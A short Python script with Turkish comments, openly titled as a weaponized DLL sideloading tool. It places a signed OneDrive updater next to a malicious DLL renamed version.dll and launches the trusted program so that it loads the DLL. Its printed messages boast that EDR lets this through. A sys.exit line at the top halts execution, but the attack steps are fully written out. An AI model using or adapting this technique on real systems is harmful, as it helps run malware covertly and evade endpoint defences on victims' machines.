import os
import shutil
import sys

# --- EMNİYET PİMİ ---
sys.exit("UYARI: Bu kod DLL Sideloading zafiyetini istismar eder.")

print("--- WEAPONIZED DLL SIDELOADING ---")

def setup_sideload():
    # 1. GÜVENİLİR UYGULAMA (Weaponized Part)
    # Simülasyon: ctypes.LoadLibrary("test.dll")
    # Gerçek: İmzalı bir Microsoft uygulaması (Örn: eski bir OneDrive updater)
    trusted_app = "OneDriveUpdater.exe" # (İmzalı)
    
    # 2. ZARARLI DLL (İsim Taklidi)
    # Uygulamanın aradığı DLL ismini kullanıyoruz.
    malicious_dll = "version.dll" # (Bizim Virüsümüz)
    
    print(f"[*] Ortam hazırlanıyor: {trusted_app} + {malicious_dll}")
    
    # Dosyaları aynı klasöre koy (Burası kritiktir)
    if not os.path.exists("Deploy"): os.mkdir("Deploy")
    shutil.copy(trusted_app, "Deploy\\")
    shutil.copy("my_virus_code.dll", f"Deploy\\{malicious_dll}")
    
    # 3. ÇALIŞTIRMA
    # Biz virüsü değil, güvenilir uygulamayı çalıştırıyoruz.
    print("[!] Güvenilir uygulama başlatılıyor...")
    os.system("Deploy\\OneDriveUpdater.exe")
    
    print("💀 VİRÜS ÇALIŞTI.")
    print("EDR sistemi 'OneDriveUpdater.exe'yi güvenli sandığı için engellemedi, ama o bizim DLL'imizi yükledi.")

if __name__ == "__main__":
    setup_sideload()